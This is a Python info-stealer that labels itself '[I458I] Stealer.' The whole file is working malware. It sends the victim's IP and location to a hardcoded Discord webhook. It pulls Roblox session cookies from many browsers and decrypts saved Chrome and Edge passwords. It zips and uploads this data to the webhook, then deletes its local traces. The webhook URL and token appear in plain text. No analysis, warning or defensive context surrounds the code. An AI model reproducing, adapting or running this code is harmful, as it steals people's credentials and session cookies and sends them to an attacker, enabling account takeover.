from discord_webhook import DiscordEmbed, DiscordWebhook
import requests,browser_cookie3,platform, GPUtil, psutil,os,shutil,base64,json,sqlite3,win32crypt,cv2,zipfile,time,pyautogui,re
from Cryptodome.Cipher import AES
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData
wbz='https://discord.com/api/webhooks/1355341651119313128/zwA2pMDA8tmh9BsWrg7AlHbjtp60J-1hqggz6uYPGWOgtTIfKNvLK7BvMJZt5BSANJd6'
def ip():
 try:
  z = requests.get("https://ipinfo.io/json").json()
  ip = z["ip"]
  ip = str(ip)
  country = z["country"]
  region = z["region"]
  city = z["city"]
  org = z["org"]
  post = z["postal"]
  tz = z["timezone"]
  x = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&", content="||@everyone||")
  y = DiscordEmbed(title=":globe_with_meridians: IP Info")
  y.add_embed_field(name="IP INFORMATION", value=f"**:wireless: | {ip}**\n\n **:round_pushpin: | {city}, {post}, {region} {country} {tz}** \n\n **:bookmark_tabs: | {org}**")
  x.add_embed(y)
  x.execute()
 except:pass
ip()
def roblos():
 coc = []
 try:
   browers = [
      browser_cookie3.chrome,
      browser_cookie3.chromium,
      browser_cookie3.brave,
      browser_cookie3.opera_gx,
      browser_cookie3.safari,
      browser_cookie3.firefox,
      browser_cookie3.opera,
      browser_cookie3.edge,
   ]
   for browser in browers:
     try:
       cookies = browser(domain_name="roblox.com")
       for cookie in cookies:
         if cookie.name == '.ROBLOSECURITY':
           coc.append(cookie.value)
     except:pass
 except:pass
 if coc == []:
      xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
      ys = DiscordEmbed(title=":no_entry_sign: **No roblox cookies found.**")
      ys.add_embed_field(name="**No cookies fetched**", value="")
      xs.add_embed(ys)
      xs.execute()
 else:pass
 if coc != []:
  with open("Cookies.txt", 'w') as GreenFN:
    for items in coc:
     GreenFN.write(f"{items}\n")
  with zipfile.ZipFile("Cookies.zip", 'w') as BrickFN:
      BrickFN.write("Cookies.txt")
  with open("Cookies.zip", 'rb') as file:
      data = {
         "username": "[I458I] Grabber.",
         "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
         }
      files = {
       "file": ("Cookies.zip", file, "application/zip")
       }
      requests.post(wbz, data=data, files=files)
 try:
  os.remove("Cookies.txt")
  os.remove("Cookies.zip")
  os.remove(BrickFN)
  os.remove(GreenFN)
 except:pass
roblos()
def sdfgasad():
 try:
  ouyhabsndufyb = False
  class PasswordExtractor:
      def __init__(self):
          pass
      def get_chrome_datetime(self, chromedate):
          return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
      def get_encryption_key(self, browser):
          if browser == "Chrome":
              local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
              with open(local_state_path, 'r', encoding='utf-8') as f:
                  local_state = f.read()
                  local_state = json.loads(local_state)
              key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
              key = key[5:]
              return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
          elif browser == "Edge":
              local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
              with open(local_state_path, 'r', encoding='utf-8') as f:
                  local_state = f.read()
                  local_state = json.loads(local_state)
              key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
              key = key[5:]
              return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
          else:
              return None
      def decrypt_password(self, password, key):
          try:
              iv = password[3:15]
              password = password[15:]
              cipher = AES.new(key, AES.MODE_GCM, iv)
              return cipher.decrypt(password)[:-16].decode()
          except:
              try:
                  return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
              except:
                  return ""
      def extract_passwords(self, browser):
          key = self.get_encryption_key(browser)
          if key is None:
              return
          if browser == "Chrome":
              ouyhabsndufyb = False
              user_profile = os.path.expanduser("~")
              db_path = os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
          elif browser == "Edge":
              ouyhabsndufyb = True
              user_profile = os.path.expanduser("~")
              db_path = os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
          filename = "BrowserData.db"
          shutil.copyfile(db_path, filename)
          db = sqlite3.connect(filename)
          cursor = db.cursor()
          cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
          with open("passwords.txt", "a") as f:
              for row in cursor.fetchall():
                  origin_url, action_url, username, _, date_created, date_last_used = row
                  password = self.decrypt_password(row[3], key)
                  if username or password:
                      f.write(f'Origin URL: {origin_url}\n')
                      f.write(f'Action URL: {action_url}\n')
                      f.write(f'Username: {username}\n')
                      f.write(f'Password: {password}\n')
                  else:
                      continue
                  if date_created != 86400000000 and date_created:
                      f.write(f"Creation date: {str(self.get_chrome_datetime(date_created))}\n")
                  if date_last_used != 86400000000 and date_last_used:
                      f.write(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}\n")
                  f.write("=" * 50 + '\n')
          cursor.close()
          db.close()
          if ouyhabsndufyb == True:
           try:
               with open("passwords.txt", 'r') as check:
                   uhj = check.read()
                   if len(uhj.strip()) > 0:
                        try:
                            with zipfile.ZipFile('passwords.zip', 'w') as L:
                                L.write("passwords.txt")
                            with open("passwords.zip", "rb") as file:
                             data = {
                                "username": "[I458I] Stealer.",
                                "avatar_url": "https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&"
                                }
                             files = {
                             "file": ("passwords.zip", file, "application/zip")
                                }
                             requests.post(wbz, data=data, files=files)
                        except:
                         try:
                            os.remove("passwords.txt")
                            os.remove(filename)
                            os.remove("passwords.zip")
                            xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
                            ys = DiscordEmbed(title=":no_entry_sign: **Error fetching passwords.**")
                            ys.add_embed_field(name="**No passwords fetched**", value="")
                            xs.add_embed(ys)
                            xs.execute()
                         except:pass
                   else:
                       os.remove("passwords.txt")
                       os.remove(filename)
                       os.remove("passwords.zip")
                       xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
                       ys = DiscordEmbed(title=":no_entry_sign: **No passwords found.**")
                       ys.add_embed_field(name="**No passwords fetched**", value="")
                       xs.add_embed(ys)
                       xs.execute()
               os.remove(filename)
               os.remove("passwords.txt")
               os.remove("passwords.zip")
           except:
             os.remove("passwords.txt")
             os.remove(filename)
             os.remove("passwords.zip")
             xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
             ys = DiscordEmbed(title=":no_entry_sign: **Error fetching passwords.**")
             ys.add_embed_field(name="**No passwords fetched**", value="")
             xs.add_embed(ys)
             xs.execute()
  password_extractor = PasswordExtractor()
  password_extractor.extract_passwords("Chrome")  
  password_extractor.extract_passwords("Edge")
 except:
    xs = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
    ys = DiscordEmbed(title=":no_entry_sign: **Error fetching passwords.**")
    ys.add_embed_field(name="**No passwords fetched**", value="")
    xs.add_embed(ys)
    xs.execute()
sdfgasad()
